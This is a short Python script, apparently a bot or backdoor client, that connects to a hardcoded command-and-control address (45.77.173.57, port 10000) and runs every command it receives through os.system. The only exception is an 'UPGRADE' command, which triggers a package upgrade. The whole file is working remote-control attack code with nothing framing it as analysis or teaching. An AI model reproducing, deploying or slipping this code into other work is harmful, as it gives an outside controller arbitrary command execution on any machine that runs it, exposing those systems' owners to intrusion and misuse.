from kpm import kpm
import socket
import os
import avalon_framework as avalon
C2ADDR = "45.77.173.57"


class sockethadler:

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((C2ADDR, 10000))

    def expect_command(self):
        return self.sock.recv(1024).decode('utf-8').replace("\n", '')


class command_interpreter:

    def __init__(self):
        pass

    def process_command(self, command):
        if command == "UPGRADE":
            upgrade_packages()
        else:
            avalon.info("Command Received: {}{}".format(avalon.FG.Y, command))
            os.system(command)


def upgrade_packages():
    kobj.upgrade_all()


s0 = sockethadler()
ci = command_interpreter()
kobj = kpm()

while True:
    ci.process_command(s0.expect_command())
